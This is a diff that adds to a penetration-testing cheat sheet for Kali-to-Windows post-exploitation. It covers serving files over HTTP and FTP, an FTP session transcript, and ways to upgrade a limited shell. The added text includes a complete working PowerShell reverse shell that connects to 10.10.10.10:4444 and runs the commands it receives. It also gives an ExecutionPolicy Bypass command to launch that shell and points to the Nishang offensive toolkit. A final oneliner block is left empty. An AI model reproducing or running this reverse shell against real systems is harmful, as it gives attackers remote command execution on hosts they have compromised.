@@ -20,6 +20,17 @@ We will look at 4 ways of uploading files to a remote Windows machine from Kali 
 3. Python HTTP Downloader
 4. FTP Downloader
 
+Most of these will require that we create a simple local webserver on our Kali box to sevre the files (NOTE: I have had issues running this command within TMUX for whatever reason... so dont run it in TMUX).
+I like to use the Python Simple HTTP Server:
+```
+root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m SimpleHTTPServer 80
+```
+Or the Python pyftpdlib FTP Server (again don't run from TMUX):
+```
+apt-get install python-pyftpdlib
+root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m pyftpdlib -p 21
+```
+
 ### Uploading Files with VBScript  
 First lets test to see if we can run VBScript  
 ```
@@ -91,9 +102,28 @@ python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10
 ```
 
 ### Uploading Files with FTP
+After running the python ftp lib on (`python -m pyftpdlib -p 21`) on Kali, you can try connecting using the windows FTP client:
+```
+C:\Users\pwnd>ftp 10.10.10.10
+Connected to 10.10.10.10
+220 pyftpdlib 1.5.3 ready.
+User (10.10.15.31:(none)): anonymous
+331 Username ok, send password.
+Password: anonymous
 
+230 Login successful.                                                                                                                      
+ftp> ls                                                                                                                                 
+dir                                                                                                                                       
+421 Active data channel timed out.                                                                                                       
+```
+If you are seeing a 421 timeout when you try to send a command it is likely because your connection is being blocked by the windows firewall. The Windows command-line ftp.exe supports the FTP active mode only. In the active mode, the server has to connect back to the client to establish data connection for a file transfer. 
 
-## Upgrade Shell with PowerShell Nishang
+You can check to see if the remote machine has Winscp.exe installed. Winscp is capable of connecting to an FTP server using passive mode and will not be blocked by the firewall.
+
+## Upgrading your Windows Shell
+You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:
+
+### Upgrade Shell with PowerShell Nishang
 
 https://github.com/samratashok/nishang
 ```
@@ -101,6 +131,22 @@ https://github.com/samratashok/nishang
 ```
 
 
+### Upgrade Windows Command Line with Powershell Reverse Shell:
+
+You can either upload the following Reverse shell (note you will need to se the IP and Port correctly):
+ReverseShell.ps1
+```
+$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()             
+```
+Then run the Powershell command from the Windows Command line like so:
+```
+powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -noexit "& ""C:\Users\Public\Downloads\ReverseShell.ps1""" 
+```
+
+*OR* you can run this oneliner from the Windows command prompt to skip the file upload step entirely:
+```
+
+```
 
 
 *Easy*
